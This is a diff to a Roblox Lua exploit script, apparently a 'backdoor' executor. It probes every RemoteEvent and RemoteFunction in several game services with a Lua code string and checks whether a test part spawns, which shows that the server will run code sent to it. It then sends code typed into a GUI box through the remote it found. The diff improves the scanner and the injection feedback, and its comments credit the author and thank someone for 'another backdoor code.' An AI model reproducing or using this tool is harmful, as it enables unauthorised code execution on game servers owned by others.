@@ -3,29 +3,36 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 
+local foundRemote = nil
+local injected = false
+
 local function findBackdoor()
     local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     local function randomName(length)
         local name = ""
         for i = 1, length do
-            local c = chars:sub(math.random(1, #chars), math.random(1, #chars))
-            name = name .. c
+            local rand = math.random(1, #chars)
+            name = name .. chars:sub(rand, rand)
         end
         return name
     end
-    for _, parent in ipairs({Workspace, ReplicatedStorage, Players}) do
+    
+    for _, parent in ipairs({Workspace, ReplicatedStorage, game:GetService("Players"), game:GetService("Lighting"), game:GetService("ServerScriptService")}) do
         for _, remote in ipairs(parent:GetDescendants()) do
             if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-                local testName = randomName(8)
-                local payload = 'Instance.new("Model", workspace).Name="' .. testName .. '"'
-                local ok
-                if remote:IsA("RemoteEvent") then
-                    ok = pcall(function() remote:FireServer(payload) end)
-                else
-                    ok = pcall(function() remote:InvokeServer(payload) end)
-                end
-                if ok then
-                    task.wait(0.1)
+                local testName = randomName(10)
+                local payload = 'local p = Instance.new("Part"); p.Name = "'..testName..'"; p.Parent = workspace; task.wait(0.5); p:Destroy()'
+                
+                local success = pcall(function()
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(payload)
+                    else
+                        remote:InvokeServer(payload)
+                    end
+                end)
+                
+                if success then
+                    task.wait(0.5)
                     local check = Workspace:FindFirstChild(testName)
                     if check then
                         check:Destroy()
@@ -39,14 +46,15 @@ local function findBackdoor()
 end
 
 local function sendCode(code)
-    local remote = findBackdoor()
-    if remote and typeof(remote) == "Instance" then
-        if remote:IsA("RemoteEvent") then
-            pcall(function() remote:FireServer(code) end)
-        elseif remote:IsA("RemoteFunction") then
-            pcall(function() remote:InvokeServer(code) end)
-        end
-        return true
+    if foundRemote and typeof(foundRemote) == "Instance" then
+        local success, errorMsg = pcall(function()
+            if foundRemote:IsA("RemoteEvent") then
+                foundRemote:FireServer(code)
+            elseif foundRemote:IsA("RemoteFunction") then
+                foundRemote:InvokeServer(code)
+            end
+        end)
+        return success
     else
         return false
     end
@@ -113,8 +121,8 @@ textBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 textBox.ClearTextOnFocus = false
 textBox.MultiLine = true
-textBox.PlaceholderText = "Reason why i use"
-textBox.Text = "Use this shit idk"
+textBox.PlaceholderText = "Enter script here"
+textBox.Text = ""
 textBox.Font = Enum.Font.Code
 textBox.TextSize = 16
 textBox.TextXAlignment = Enum.TextXAlignment.Left
@@ -185,8 +193,6 @@ scrollFrame.BorderSizePixel = 0
 scrollFrame.ScrollBarThickness = 6
 scrollFrame.CanvasSize = UDim2.new(0, 0, 6, 0)
 scrollFrame.Parent = hubFrame
-
-local injected = false
 
 local function makeButton(name, yPos, code)
  local btn = Instance.new("TextButton")
@@ -273,10 +279,14 @@ clear.MouseButton1Click:Connect(function()
 end)
 
 inject.MouseButton1Click:Connect(function()
- local remote = findBackdoor()
- if remote then
+ foundRemote = findBackdoor()
+ if foundRemote then
   injected = true
   inject.Text = "Injected"
+  inject.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+ else
+  inject.Text = "Failed"
+  inject.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
  end
 end)
 
@@ -319,3 +329,4 @@ warn("Testing warn")
 --Found = can skid
 --Code by Curse (Yaazkidd lmao why do I need to!!)
 --My Dizcord: teamdbq
+--Also thanks to Syntex for giving me another backdoor code. Appreciate it.
